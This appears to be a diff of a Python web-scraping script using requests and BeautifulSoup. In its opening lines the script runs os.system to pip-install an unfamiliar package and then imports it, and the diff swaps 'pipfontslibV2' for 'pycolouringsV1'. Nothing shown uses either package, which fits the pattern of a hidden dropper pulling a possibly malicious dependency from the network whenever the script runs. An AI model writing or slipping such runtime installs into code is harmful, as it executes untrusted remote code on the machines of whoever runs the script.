@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontslibV2")
-import pipfontslibV2
+os.system("pip install pycolouringsV1")
+import pycolouringsV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
